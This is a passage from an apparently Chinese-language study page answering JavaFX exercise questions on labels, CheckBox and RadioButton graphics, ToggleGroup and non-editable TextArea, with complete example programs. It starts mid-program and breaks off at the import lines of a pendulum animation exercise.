        <span class="token class-name">Scene</span> scene <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Scene</span><span class="token punctuation">(</span>vbox<span class="token punctuation">,</span> <span class="token number">300</span><span class="token punctuation">,</span> <span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// 设置舞台的场景</span>
        primaryStage<span class="token punctuation">.</span><span class="token function">setScene</span><span class="token punctuation">(</span>scene<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// 显示舞台</span>
        primaryStage<span class="token punctuation">.</span><span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="如何在一个标签中显示多行文本"><a class="markdownIt-Anchor" href="#如何在一个标签中显示多行文本"></a> 如何在一个标签中显示多行文本？</h2>
<ul>
<li>
<p>使用换行符\n:<br>
<code>Label label = new Label("This is the first line.\nThis is the second line.");</code></p>
</li>
<li>
<p>使用setWrapText方法:</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Label</span> label <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Label</span><span class="token punctuation">(</span><span class="token string">"This is a long text that will be wrapped to the next line when it is too long to fit in the label width."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
label<span class="token punctuation">.</span><span class="token function">setWrapText</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
label<span class="token punctuation">.</span><span class="token function">setMaxWidth</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 设置标签的最大宽度</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
</li>
</ul>
<h2 id="为何-getpane-方法是受保护的-为何数据域-text-是受保护的"><a class="markdownIt-Anchor" href="#为何-getpane-方法是受保护的-为何数据域-text-是受保护的"></a> 为何 getPane() 方法是受保护的？ 为何数据域 text 是受保护的？</h2>
<p>getPane()方法和text数据域被声明为protected，通常有以下几种可能的原因：<br>
设计者希望限制这些成员的访问范围，只让某些特定的类可以访问它们，以保护这些成员不被其他不相关的类访问和修改。<br>
这些成员是类的内部实现细节，设计者不希望外部的类直接访问和依赖它们。通过将它们声明为protected，可以避免这些内部实现细节被外部的类所使用，从而保持类的封装性。<br>
这些成员可能在其子类中被重写或者使用，因此需要在子类中可以访问它们。<br>
总之，将方法或数据域声明为protected，通常是出于保护这些成员，防止它们被不相关的类访问和修改的考虑，同时也保持了类的封装性和灵活性。</p>
<h2 id="可以将用于-labeled-的所有方法用于-checkbox"><a class="markdownIt-Anchor" href="#可以将用于-labeled-的所有方法用于-checkbox"></a> 可以将用于 Labeled 的所有方法用于 CheckBox?</h2>
<p>CheckBox 是 Labeled 的子类，因此 CheckBox 可以使用 Labeled 中定义的所有方法。Labeled 类提供了用于设置和获取标签文本、图形以及与之相关的其他属性的方法。由于 CheckBox 继承自 Labeled，因此可以在 CheckBox 对象上调用 Labeled 类中的这些方法。</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>application<span class="token punctuation">.</span></span><span class="token class-name">Application</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>scene<span class="token punctuation">.</span></span><span class="token class-name">Scene</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>scene<span class="token punctuation">.</span>control<span class="token punctuation">.</span></span><span class="token class-name">CheckBox</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>scene<span class="token punctuation">.</span>layout<span class="token punctuation">.</span></span><span class="token class-name">VBox</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>stage<span class="token punctuation">.</span></span><span class="token class-name">Stage</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">CheckBoxExample</span> <span class="token keyword">extends</span> <span class="token class-name">Application</span> <span class="token punctuation">{</span>

    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token function">launch</span><span class="token punctuation">(</span>args<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">start</span><span class="token punctuation">(</span><span class="token class-name">Stage</span> primaryStage<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token comment">// 创建一个 CheckBox</span>
        <span class="token class-name">CheckBox</span> checkBox <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">CheckBox</span><span class="token punctuation">(</span><span class="token string">"Option 1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// 使用 Labeled 类的 setText 方法设置文本</span>
        checkBox<span class="token punctuation">.</span><span class="token function">setText</span><span class="token punctuation">(</span><span class="token string">"New Option"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// 使用 Labeled 类的 getText 方法获取文本</span>
        <span class="token class-name">String</span> text <span class="token operator">=</span> checkBox<span class="token punctuation">.</span><span class="token function">getText</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"CheckBox text: "</span> <span class="token operator">+</span> text<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// 设置和获取其他 Labeled 类中定义的属性...</span>

        <span class="token comment">// 创建一个 VBox</span>
        <span class="token class-name">VBox</span> vbox <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">VBox</span><span class="token punctuation">(</span>checkBox<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// 创建一个 Scene</span>
        <span class="token class-name">Scene</span> scene <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Scene</span><span class="token punctuation">(</span>vbox<span class="token punctuation">,</span> <span class="token number">300</span><span class="token punctuation">,</span> <span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// 设置 Stage 的 Scene</span>
        primaryStage<span class="token punctuation">.</span><span class="token function">setScene</span><span class="token punctuation">(</span>scene<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// 显示 Stage</span>
        primaryStage<span class="token punctuation">.</span><span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="可否将一个复选框中-graphic-属性设置为一个节点"><a class="markdownIt-Anchor" href="#可否将一个复选框中-graphic-属性设置为一个节点"></a> 可否将一个复选框中 graphic 属性设置为一个节点？</h2>
<p>可以在 CheckBox 的 graphic 属性中设置一个节点。CheckBox 类继承自 Labeled 类，而 Labeled 类提供了一个 graphic 属性，用于存放一个与标签文本一起显示的图形节点。这个图形节点可以是任何 JavaFX 节点，包括但不限于 ImageView、Rectangle、Circle 等。</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>application<span class="token punctuation">.</span></span><span class="token class-name">Application</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>scene<span class="token punctuation">.</span></span><span class="token class-name">Scene</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>scene<span class="token punctuation">.</span>control<span class="token punctuation">.</span></span><span class="token class-name">CheckBox</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>scene<span class="token punctuation">.</span>image<span class="token punctuation">.</span></span><span class="token class-name">Image</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>scene<span class="token punctuation">.</span>image<span class="token punctuation">.</span></span><span class="token class-name">ImageView</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>scene<span class="token punctuation">.</span>layout<span class="token punctuation">.</span></span><span class="token class-name">VBox</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>stage<span class="token punctuation">.</span></span><span class="token class-name">Stage</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">CheckBoxGraphicExample</span> <span class="token keyword">extends</span> <span class="token class-name">Application</span> <span class="token punctuation">{</span>

    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token function">launch</span><span class="token punctuation">(</span>args<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">start</span><span class="token punctuation">(</span><span class="token class-name">Stage</span> primaryStage<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token comment">// 创建一个 CheckBox</span>
        <span class="token class-name">CheckBox</span> checkBox <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">CheckBox</span><span class="token punctuation">(</span><span class="token string">"Option 1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// 创建一个图像视图节点</span>
        <span class="token class-name">Image</span> image <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Image</span><span class="token punctuation">(</span><span class="token string">"path/to/your/image/file"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">ImageView</span> imageView <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ImageView</span><span class="token punctuation">(</span>image<span class="token punctuation">)</span><span class="token punctuation">;</span>
        imageView<span class="token punctuation">.</span><span class="token function">setFitHeight</span><span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        imageView<span class="token punctuation">.</span><span class="token function">setFitWidth</span><span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// 将图像视图设置为 CheckBox 的图形</span>
        checkBox<span class="token punctuation">.</span><span class="token function">setGraphic</span><span class="token punctuation">(</span>imageView<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// 创建一个 VBox</span>
        <span class="token class-name">VBox</span> vbox <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">VBox</span><span class="token punctuation">(</span>checkBox<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// 创建一个 Scene</span>
        <span class="token class-name">Scene</span> scene <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Scene</span><span class="token punctuation">(</span>vbox<span class="token punctuation">,</span> <span class="token number">300</span><span class="token punctuation">,</span> <span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// 设置 Stage 的 Scene</span>
        primaryStage<span class="token punctuation">.</span><span class="token function">setScene</span><span class="token punctuation">(</span>scene<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// 显示 Stage</span>
        primaryStage<span class="token punctuation">.</span><span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="可以将单选按钮的-graphic-属性设置为任何节点吗"><a class="markdownIt-Anchor" href="#可以将单选按钮的-graphic-属性设置为任何节点吗"></a> 可以将单选按钮的 graphic 属性设置为任何节点吗？</h2>
<p>RadioButton 类继承自 Labeled 类，因此可以在 RadioButton 的 graphic 属性中设置任何 JavaFX 节点。graphic 属性用于存放一个与标签文本一起显示的图形节点，这个图形节点可以是 ImageView、Rectangle、Circle 等任何 JavaFX 节点。</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>application<span class="token punctuation">.</span></span><span class="token class-name">Application</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>scene<span class="token punctuation">.</span></span><span class="token class-name">Scene</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>scene<span class="token punctuation">.</span>control<span class="token punctuation">.</span></span><span class="token class-name">RadioButton</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>scene<span class="token punctuation">.</span>image<span class="token punctuation">.</span></span><span class="token class-name">Image</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>scene<span class="token punctuation">.</span>image<span class="token punctuation">.</span></span><span class="token class-name">ImageView</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>scene<span class="token punctuation">.</span>layout<span class="token punctuation">.</span></span><span class="token class-name">VBox</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>stage<span class="token punctuation">.</span></span><span class="token class-name">Stage</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">RadioButtonGraphicExample</span> <span class="token keyword">extends</span> <span class="token class-name">Application</span> <span class="token punctuation">{</span>

    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token function">launch</span><span class="token punctuation">(</span>args<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">start</span><span class="token punctuation">(</span><span class="token class-name">Stage</span> primaryStage<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token comment">// 创建一个 RadioButton</span>
        <span class="token class-name">RadioButton</span> radioButton <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">RadioButton</span><span class="token punctuation">(</span><span class="token string">"Option 1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// 创建一个图像视图节点</span>
        <span class="token class-name">Image</span> image <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Image</span><span class="token punctuation">(</span><span class="token string">"path/to/your/image/file"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">ImageView</span> imageView <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ImageView</span><span class="token punctuation">(</span>image<span class="token punctuation">)</span><span class="token punctuation">;</span>
        imageView<span class="token punctuation">.</span><span class="token function">setFitHeight</span><span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        imageView<span class="token punctuation">.</span><span class="token function">setFitWidth</span><span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// 将图像视图设置为 RadioButton 的图形</span>
        radioButton<span class="token punctuation">.</span><span class="token function">setGraphic</span><span class="token punctuation">(</span>imageView<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// 创建一个 VBox</span>
        <span class="token class-name">VBox</span> vbox <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">VBox</span><span class="token punctuation">(</span>radioButton<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// 创建一个 Scene</span>
        <span class="token class-name">Scene</span> scene <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Scene</span><span class="token punctuation">(</span>vbox<span class="token punctuation">,</span> <span class="token number">300</span><span class="token punctuation">,</span> <span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// 设置 Stage 的 Scene</span>
        primaryStage<span class="token punctuation">.</span><span class="token function">setScene</span><span class="token punctuation">(</span>scene<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// 显示 Stage</span>
        primaryStage<span class="token punctuation">.</span><span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="如何将单选按钮分组"><a class="markdownIt-Anchor" href="#如何将单选按钮分组"></a> 如何将单选按钮分组？</h2>
<p>使用 <code>ToggleGroup</code> 类来将一组 <code>RadioButton</code> 控件分组，使得在这一组单选按钮中，只有一个按钮可以被选中。当选择一个新的单选按钮时，先前选中的按钮会自动取消选中。</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>application<span class="token punctuation">.</span></span><span class="token class-name">Application</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>scene<span class="token punctuation">.</span></span><span class="token class-name">Scene</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>scene<span class="token punctuation">.</span>control<span class="token punctuation">.</span></span><span class="token class-name">RadioButton</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>scene<span class="token punctuation">.</span>control<span class="token punctuation">.</span></span><span class="token class-name">ToggleGroup</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>scene<span class="token punctuation">.</span>layout<span class="token punctuation">.</span></span><span class="token class-name">VBox</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>stage<span class="token punctuation">.</span></span><span class="token class-name">Stage</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">RadioButtonGroupExample</span> <span class="token keyword">extends</span> <span class="token class-name">Application</span> <span class="token punctuation">{</span>

    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token function">launch</span><span class="token punctuation">(</span>args<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">start</span><span class="token punctuation">(</span><span class="token class-name">Stage</span> primaryStage<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token comment">// 创建一个 ToggleGroup</span>
        <span class="token class-name">ToggleGroup</span> group <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ToggleGroup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// 创建单选按钮并将它们添加到 ToggleGroup</span>
        <span class="token class-name">RadioButton</span> rb1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">RadioButton</span><span class="token punctuation">(</span><span class="token string">"Option 1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        rb1<span class="token punctuation">.</span><span class="token function">setToggleGroup</span><span class="token punctuation">(</span>group<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">RadioButton</span> rb2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">RadioButton</span><span class="token punctuation">(</span><span class="token string">"Option 2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        rb2<span class="token punctuation">.</span><span class="token function">setToggleGroup</span><span class="token punctuation">(</span>group<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">RadioButton</span> rb3 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">RadioButton</span><span class="token punctuation">(</span><span class="token string">"Option 3"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        rb3<span class="token punctuation">.</span><span class="token function">setToggleGroup</span><span class="token punctuation">(</span>group<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// 创建一个 VBox</span>
        <span class="token class-name">VBox</span> vbox <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">VBox</span><span class="token punctuation">(</span>rb1<span class="token punctuation">,</span> rb2<span class="token punctuation">,</span> rb3<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// 创建一个 Scene</span>
        <span class="token class-name">Scene</span> scene <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Scene</span><span class="token punctuation">(</span>vbox<span class="token punctuation">,</span> <span class="token number">300</span><span class="token punctuation">,</span> <span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// 设置 Stage 的 Scene</span>
        primaryStage<span class="token punctuation">.</span><span class="token function">setScene</span><span class="token punctuation">(</span>scene<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// 显示 Stage</span>
        primaryStage<span class="token punctuation">.</span><span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="如何禁用一个文本区域里面的编辑功能"><a class="markdownIt-Anchor" href="#如何禁用一个文本区域里面的编辑功能"></a> 如何禁用一个文本区域里面的编辑功能？</h2>
<p>使用 setEditable 方法来设置 TextArea 是否可编辑。如果将 setEditable 方法的参数设置为 false，则该 TextArea 将不可编辑。</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>application<span class="token punctuation">.</span></span><span class="token class-name">Application</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>scene<span class="token punctuation">.</span></span><span class="token class-name">Scene</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>scene<span class="token punctuation">.</span>control<span class="token punctuation">.</span></span><span class="token class-name">TextArea</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>scene<span class="token punctuation">.</span>layout<span class="token punctuation">.</span></span><span class="token class-name">VBox</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>stage<span class="token punctuation">.</span></span><span class="token class-name">Stage</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">TextAreaNotEditableExample</span> <span class="token keyword">extends</span> <span class="token class-name">Application</span> <span class="token punctuation">{</span>

    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token function">launch</span><span class="token punctuation">(</span>args<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">start</span><span class="token punctuation">(</span><span class="token class-name">Stage</span> primaryStage<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token comment">// 创建一个 TextArea</span>
        <span class="token class-name">TextArea</span> textArea <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TextArea</span><span class="token punctuation">(</span><span class="token string">"This is some text."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// 将 TextArea 设置为不可编辑</span>
        textArea<span class="token punctuation">.</span><span class="token function">setEditable</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// 创建一个 VBox</span>
        <span class="token class-name">VBox</span> vbox <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">VBox</span><span class="token punctuation">(</span>textArea<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// 创建一个 Scene</span>
        <span class="token class-name">Scene</span> scene <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Scene</span><span class="token punctuation">(</span>vbox<span class="token punctuation">,</span> <span class="token number">300</span><span class="token punctuation">,</span> <span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// 设置 Stage 的 Scene</span>
        primaryStage<span class="token punctuation">.</span><span class="token function">setScene</span><span class="token punctuation">(</span>scene<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// 显示 Stage</span>
        primaryStage<span class="token punctuation">.</span><span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="编写一个程序用动画完成来回摆动如图-15-31-所示-单击-释放鼠标以暂停-恢复动画-加上1526-改变透明度-当球摆动的时候改变球的透明度"><a class="markdownIt-Anchor" href="#编写一个程序用动画完成来回摆动如图-15-31-所示-单击-释放鼠标以暂停-恢复动画-加上1526-改变透明度-当球摆动的时候改变球的透明度"></a> 编写一个程序，用动画完成来回摆动，如图 15-31 所示。单击 / 释放鼠标以暂停 / 恢复动画。加上15.26 （改变透明度）， 当球摆动的时候改变球的透明度</h2>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>animation<span class="token punctuation">.</span></span><span class="token class-name">FadeTransition</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>animation<span class="token punctuation">.</span></span><span class="token class-name">Interpolator</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>animation<span class="token punctuation">.</span></span><span class="token class-name">PathTransition</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>animation<span class="token punctuation">.</span></span><span class="token class-name">Timeline</span></span><span class="token punctuation">;</span>
